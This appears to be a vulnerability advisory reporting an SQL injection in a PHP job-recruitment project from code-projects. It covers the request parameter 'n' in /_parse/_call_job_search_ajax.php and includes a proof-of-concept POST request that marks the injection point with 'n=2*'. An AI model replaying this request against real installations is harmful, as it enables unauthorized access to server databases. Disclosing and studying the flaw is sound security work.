# job-recruitment-in-php has sql injection vulnerability in /\_parse/\_call_job_search_ajax.php

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
/\_parse/\_call_job_search_ajax.php

## describe

An unrestricted SQL injection attack exists in a job-recruitment in /\_parse/\_call_job_search_ajax.php . The parameters that can be controlled are as follows:  $j1 parameter . This function executes the jobtitle parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $j1 = $_REQUEST['n']  is obtained in the function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241231163353681](https://github.com/user-attachments/assets/83014898-890e-493a-b0b2-1e240271f241)

## POC

```
POST /_parse/_call_job/search_ajax.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

n=2*
```

**Result**

![image-20241231163630981](https://github.com/user-attachments/assets/c4da48d6-d381-44a0-b699-5ea98a5e15e8)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤